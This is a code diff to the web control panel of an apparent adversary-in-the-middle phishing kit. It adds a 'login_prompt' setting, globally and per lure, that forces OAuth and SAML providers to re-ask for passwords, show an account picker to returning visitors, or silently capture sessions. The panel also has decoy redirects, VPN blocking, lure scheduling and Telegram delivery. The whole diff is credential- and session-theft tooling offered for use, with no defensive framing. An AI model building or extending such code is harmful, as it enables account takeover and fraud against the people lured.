@@ -199,6 +199,10 @@ async function mgConfig() {
     return '<div class="field"><label>' + esc(l) + '</label><input data-mcfg="' + k + '" type="' + (type || 'text') + '" value="' + esc(v === null || v === undefined ? '' : v) + '">' + (h ? '<span class="hint">' + esc(h) + '</span>' : '') + '</div>';
   }
   function sw(l, k, on, h) { return '<label class="switch mb14"><input type="checkbox" data-mcfgsw="' + k + '"' + (on ? ' checked' : '') + '><span class="track"></span><span class="muted">' + esc(l) + '</span></label>' + (h ? '<div class="hint" style="margin-top:-8px;margin-bottom:12px">' + esc(h) + '</div>' : ''); }
+  function sel(l, k, v, opts, h) {
+    var o = opts.map(function (x) { return '<option value="' + esc(x[0]) + '"' + ((v || '') === x[0] ? ' selected' : '') + '>' + esc(x[1]) + '</option>'; }).join('');
+    return '<div class="field"><label>' + esc(l) + '</label><select data-mcfg="' + k + '">' + o + '</select>' + (h ? '<span class="hint">' + esc(h) + '</span>' : '') + '</div>';
+  }
   return '<div class="card"><div class="card-body">' +
     '<div class="row"><div class="field"><label>Domain</label><input data-mcfg="domain" value="' + esc(g.domain) + '"></div>' +
     '<div class="field"><label>External IP</label><input data-mcfg="external_ipv4" value="' + esc(g.external_ipv4) + '"></div></div>' +
@@ -206,8 +210,9 @@ async function mgConfig() {
     '<div class="field"><label>Dashboard subdomain</label><input data-mcfg="dashboardsub" value="' + esc(g.dashboard_sub) + '"></div></div>' +
     sw('unauth_redirect (302 decoy)', 'unauth_redirect', g.unauth_redirect) +
     sw('strip_headers', 'strip_headers', g.strip_headers) +
-    sw('force_login (always show the login form)', 'force_login', g.force_login,
-      'Adds prompt=login to OAuth hops and wfresh=0 to SAML so an already-signed-in visitor still types their password.') +
+    sel('login_prompt (what the provider is asked to show)', 'login_prompt', g.login_prompt,
+      [['login', 'login - always ask for credentials'], ['select_account', 'select_account - show the account picker'], ['off', 'off - never prompt (session-only)']],
+      'login adds prompt=login, select_account shows the account tile so a returning visitor picks their account and skips typing the email, off never prompts and only captures a session. force_login on|off still works as an alias. SAML/WS-Fed hops use wfresh=0 unless off.') +
     sw('autocert (ACME TLS)', 'autocert', g.autocert) +
     sw('block_vpn', 'blockvpn', g.block_vpn) +
     '<div class="row"><div class="field"><label>Telegram chat id</label><input data-mcfg="chatid" value="' + esc(t.chatid) + '"></div>' +
@@ -406,9 +411,16 @@ function mgNewLure(auto, sub) {
 }
 function mgEditLure(l) {
   function f(label, field, val, hint) { return '<div class="field"><label>' + label + '</label><input data-mlf="' + field + '" value="' + esc(val || '') + '">' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>'; }
+  function s(label, field, val, opts, hint) {
+    var o = opts.map(function (x) { return '<option value="' + x[0] + '"' + ((val || '') === x[0] ? ' selected' : '') + '>' + esc(x[1]) + '</option>'; }).join('');
+    return '<div class="field"><label>' + label + '</label><select data-mlf="' + field + '">' + o + '</select>' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>';
+  }
   openModal('Edit lure #' + l.id,
     f('Path', 'path', l.path) + f('Hostname', 'hostname', l.hostname, 'must end with the base domain') +
     f('redirect_url', 'redirect_url', l.redirect_url) + f('UA filter (regex)', 'ua_filter', l.ua_filter) +
+    s('login_prompt', 'login_prompt', l.login_prompt,
+      [['', 'inherit global'], ['login', 'login - always ask'], ['select_account', 'select_account - account picker'], ['off', 'off - never prompt']],
+      'empty = use the global setting; returning-visitor lures want select_account') +
     f('info', 'info', l.info) + f('active_hours', 'active_hours', l.active_hours, 'HH:MM-HH:MM') +
     f('active_days', 'active_days', l.active_days, 'Mon,Tue,…') + f('active_tz', 'active_tz', l.active_tz, 'IANA tz') +
     f('og_title', 'og_title', l.og_title) + f('og_desc', 'og_desc', l.og_desc) +
